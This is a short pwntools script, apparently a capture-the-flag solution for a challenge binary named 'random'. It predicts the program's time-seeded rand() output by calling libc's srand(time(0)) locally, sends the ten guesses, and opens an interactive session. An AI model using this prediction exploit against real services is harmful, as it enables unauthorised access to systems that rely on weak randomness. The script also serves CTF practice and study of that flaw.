from pwn import *

elf = context.binary = ELF('./random') 

io = process()
#io = remote('challs.tfcctf.com',31094)
from ctypes import CDLL

libc = CDLL("libc.so.6")

libc.srand(libc.time(0))
nbs = []
for i in range(10):
    nbs.append(libc.rand())
io.recvuntil(b'Guess my numbers!\n')
for i in nbs:
    io.sendline(str(i))
io.interactive()
